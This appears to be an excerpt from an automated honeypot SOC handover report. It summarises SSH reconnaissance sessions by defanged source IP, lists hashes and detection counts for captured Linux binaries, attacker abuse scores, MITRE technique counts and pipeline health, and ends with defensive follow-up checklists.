| **Last Seen** | 2026-06-06 18:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-06 18:28:03` | `cowrie.session.connect` |
| `2026-06-06 18:28:03` | `cowrie.client.version` |
| `2026-06-06 18:28:04` | `cowrie.client.kex` |
| `2026-06-06 18:28:04` | `cowrie.login.success` |
| `2026-06-06 18:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.154.45[.]93` to AbuseIPDB if not already reported
- [ ] Block `217.154.45[.]93` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.75.199[.]4` | **57** | 2026-06-06 17:56 | 2026-06-06 18:08 | 0m | 56 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `83.168.110[.]83` | **5** | 2026-06-06 18:18 | 2026-06-06 18:25 | 4m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `123.13.41[.]128` | **3** | 2026-06-06 19:12 | 2026-06-06 19:24 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `195.96.139[.]41` | **2** | 2026-06-06 18:17 | 2026-06-06 18:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]13` | **2** | 2026-06-06 18:30 | 2026-06-06 18:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.13.100[.]52` | 1 | 2026-06-06 17:53 | 2026-06-06 17:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `111.42.183[.]124` | 1 | 2026-06-06 18:22 | 2026-06-06 18:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]85` | 1 | 2026-06-06 19:10 | 2026-06-06 19:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `217.154.45[.]93` | 1 | 2026-06-06 18:28 | 2026-06-06 18:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.212.227[.]224` | 1 | 2026-06-06 18:27 | 2026-06-06 18:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `41.216.177[.]55` | 1 | 2026-06-06 18:20 | 2026-06-06 18:20 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.153.12[.]68` | 1 | 2026-06-06 17:47 | 2026-06-06 17:47 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `57.151.130[.]0` | 1 | 2026-06-06 19:27 | 2026-06-06 19:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]6` | 1 | 2026-06-06 19:08 | 2026-06-06 19:08 | 1s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]225` | 1 | 2026-06-06 19:06 | 2026-06-06 19:06 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]77` | 1 | 2026-06-06 19:06 | 2026-06-06 19:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]8` | 1 | 2026-06-06 18:30 | 2026-06-06 18:30 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `57.151.130[.]0` | US | Microsoft Limited | **100** ⚠️ | 2 |
| `94.231.206[.]13` | SG | FR ONYPHE | **100** ⚠️ | 50 |
| `123.13.41[.]128` | CN | China Unicom Henan province network | **100** ⚠️ | 29 |
| `195.96.139[.]41` | GB | Driftnet Ltd | **100** ⚠️ | 2 |
| `103.75.199[.]4` | DE | Parsun Network Solutions PTY LTD | **100** ⚠️ | 19 |
| `43.153.12[.]68` | US | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 45 |
| `94.231.206[.]8` | SG | FR ONYPHE | **100** ⚠️ | 50 |
| `217.154.45[.]93` | GB | IONOS SE | **100** ⚠️ | 33 |
| `91.231.89[.]77` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `111.42.183[.]124` | CN | China Mobile Communications Corporation | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 121 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 72 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 19 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |

---

## 🔕 False Positive Summary (31 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 28 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 130 cases |
| Tool 34  | Credential Extractor        | ✅ 91 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 3 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 20 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 31 filtered (23.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 18 priority case(s) shown individually · 17 recon entry/entries in table (5 group(s) consolidating 69 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-06T19:29:06Z_
